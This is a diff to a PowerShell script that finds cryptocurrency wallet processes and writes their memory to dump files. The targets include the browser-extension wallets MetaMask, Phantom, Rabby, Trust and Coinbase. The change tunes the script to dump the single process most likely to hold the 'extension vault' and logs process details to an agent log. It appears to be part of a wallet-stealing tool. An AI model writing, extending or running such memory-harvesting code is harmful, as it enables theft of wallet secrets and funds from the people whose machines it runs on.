@@ -119,20 +119,39 @@ if ($Name -in @('phantom', 'metamask', 'rabby', 'trust', 'coinbase')) {
     }
 }
 
+$isBrowser = $Name -in @('phantom', 'metamask', 'rabby', 'trust', 'coinbase')
+# Browsers get a single copy: the extension vault lives in the largest content
+# process that fits, and a second ~190 MB dump adds little under a single
+# attempt. Desktop wallets keep the historical two candidates.
+$maxDumps = if ($isBrowser) { 1 } else { 2 }
+
 $seen = @{}
-$count = 0
+$dumpedCount = 0
+$bigReported = $false
 foreach ($process in ($candidates | Sort-Object WorkingSet64 -Descending)) {
     if ($seen.ContainsKey($process.Id)) { continue }
     $seen[$process.Id] = 1
-    if ($count -ge 2) { break }
-    $count++
+    if ($dumpedCount -ge $maxDumps) { break }
 
     $size = [int64]$process.WorkingSet64
     if ($size -gt 1610612736) {
-        Add-Line ("BIG|{0}|{1}" -f $process.Id, [int]($size / 1MB))
+        # Try the next, smaller content process before giving up.
+        if (-not $bigReported) {
+            Add-Line ("BIG|{0}|{1}" -f $process.Id, [int]($size / 1MB))
+            $bigReported = $true
+        }
         continue
     }
 
+    # stdout reaches agent.log: the pid, size and whether this is a Firefox
+    # content process are what the diagnostic asks for.
+    $child = 'main'
+    if ($isBrowser) {
+        $info = Get-CimInstance Win32_Process -Filter "ProcessId = $($process.Id)"
+        if ($info -and $info.CommandLine -match '-contentproc') { $child = 'contentproc' }
+        elseif ($info -and $info.CommandLine -match '--extension-process') { $child = 'extension' }
+    }
+    [Console]::Out.WriteLine("TARGET|{0}|{1}|{2}|{3}" -f $process.Id, $process.ProcessName, [int]($size / 1MB), $child)
     $prefix = if ($Tag) { "wallet-$Tag-$Name" } else { "wallet-$Name" }
     $path = Join-Path $OutDir ("{0}-{1}-{2}.dmp" -f $prefix, $process.Id, (Get-Date -Format yyyyMMddHHmmss))
     $handle = [SpcDump]::OpenProcess(0x0410, $false, [uint32]$process.Id)
@@ -144,6 +163,7 @@ foreach ($process in ($candidates | Sort-Object WorkingSet64 -Descending)) {
     [SpcDump]::CloseHandle($handle)
     if ($ok) {
         Add-Line $path
+        $dumpedCount++
     } else {
         Remove-Item -LiteralPath $path -Force
     }
